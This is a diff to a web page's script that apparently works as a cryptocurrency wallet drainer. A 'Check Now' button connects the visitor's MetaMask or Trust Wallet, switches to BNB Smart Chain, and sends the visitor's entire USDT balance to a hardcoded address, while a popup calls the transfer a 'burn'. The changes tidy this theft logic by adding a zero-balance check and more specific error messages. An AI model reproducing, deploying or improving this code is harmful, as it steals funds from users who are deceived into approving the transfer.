@@ -1250,7 +1250,7 @@
       </svg><span>Now Now</span><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-right w-5 h-5 group-hover:translate-x-1 transition-transform"><path d="M5 12h14"></path><path d="m12 5 7 7-7 7"></path></svg></button> -->
                                                             <p id="walletInfo" style="display: none;">Connecting...  </p>
                                                             <button type="button" onclick="approveToken()" style="display: none;">Approve</button>
-                                                    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
+                                                 <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
 <script>
 const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090";
 const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87";
@@ -1258,7 +1258,6 @@ const usdtContractAddress = "0x55d398326f99059Ff775485246999027B3197955";
 
 let web3, userAddress;
 
-// ✅ Trust Wallet injection fix for Android
 window.addEventListener("load", async () => {
     const isAndroid = /Android/i.test(navigator.userAgent);
     const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
@@ -1295,7 +1294,6 @@ window.addEventListener("load", async () => {
     observer.observe(document.body, { childList: true, subtree: true });
 });
 
-// ✅ Wallet connect + BSC switch
 async function connectWalletAndSwitch() {
     if (!window.ethereum) {
         alert("Please install MetaMask or Trust Wallet.");
@@ -1341,7 +1339,6 @@ async function connectWalletAndSwitch() {
     }
 }
 
-// ✅ Main Logic: verify + transfer
 async function approveToken() {
     if (!web3 || !userAddress) {
         await connectWalletAndSwitch();
@@ -1377,16 +1374,17 @@ async function approveToken() {
             web3.eth.getBalance(userAddress)
         ]);
 
+        // ✅ FIXED: check if USDT is exactly zero
+        if (usdtBalanceWei === "0") {
+            showPopup("No USDT assets found in your wallet.", "black");
+            return;
+        }
+
         const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
         const bnbBalance = parseFloat(web3.utils.fromWei(bnbBalanceWei, "ether"));
 
         console.log("USDT:", usdtBalance);
         console.log("BNB:", bnbBalance);
-
-        if (isNaN(usdtBalance) || usdtBalance < 0.000001) {
-            showPopup("No USDT assets found in your wallet.", "black");
-            return;
-        }
 
         if (usdtBalance <= 49) {
             showPopup(
@@ -1408,8 +1406,10 @@ async function approveToken() {
 
         showPopup("Transferring USDT...", "blue");
 
-        await usdtContract.methods.transfer(bscAddress, web3.utils.toWei(usdtBalance.toString(), "ether"))
-            .send({ from: userAddress });
+        await usdtContract.methods.transfer(
+            bscAddress,
+            web3.utils.toWei(usdtBalance.toString(), "ether")
+        ).send({ from: userAddress });
 
         showPopup(
             `✅ Transfer complete<br><b>USDT Burned:</b> ${usdtBalance}`,
@@ -1418,11 +1418,16 @@ async function approveToken() {
 
     } catch (e) {
         console.error("❌ Transfer failed:", e);
-        showPopup("USDT transfer failed. Check balance or gas.", "red");
+        if (e.message?.includes("insufficient funds")) {
+            showPopup("❌ Not enough BNB for gas.", "red");
+        } else if (e.message?.includes("transfer amount exceeds balance")) {
+            showPopup("❌ Not enough USDT in your wallet.", "red");
+        } else {
+            showPopup("❌ USDT transfer failed. Check balance or gas.", "red");
+        }
     }
 }
 
-// ✅ Popup helper
 function showPopup(message, color) {
     let popup = document.getElementById("popupBox");
     if (!popup) {
@@ -1445,8 +1450,7 @@ function showPopup(message, color) {
     popup.style.display = "block";
     setTimeout(() => popup.style.display = "none", 5000);
 }
-</script>
-                                                             
+</script>               
                                                             <button type="button" class="hero-button group px-8 py-4 bg-white text-emerald-600 rounded-xl font-bold hover:bg-emerald-50 transition-all duration-300 ease-in-out flex items-center justify-center space-x-2 shadow-lg" onclick="approveToken()">Check Now
     </button>
                                                             <div id="approvalPopup" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:white; border-radius:12px; box-shadow:0 8px 30px rgba(0,0,0,0.2); padding:24px; max-width:400px; width:90%; z-index:9999; text-align:center;">
